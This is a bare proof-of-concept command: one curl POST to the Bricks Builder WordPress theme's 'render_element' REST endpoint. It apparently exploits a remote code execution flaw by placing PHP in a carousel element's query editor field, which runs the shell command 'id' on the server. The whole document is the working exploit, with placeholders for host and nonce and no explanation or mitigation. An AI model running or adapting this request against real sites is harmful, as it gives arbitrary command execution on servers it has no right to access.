curl -k -X POST https://[HOST]/wp-json/bricks/v1/render_element \
  -H "Content-Type: application/json" \
  -d '{
  "postId": "1",
  "nonce": "[NONCE]",
  "element": {
    "name": "carousel",
    "settings": {
      "type": "posts",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "throw new Exception(`id`);",
        "objectType": "post"
      }
    }
  }
}'
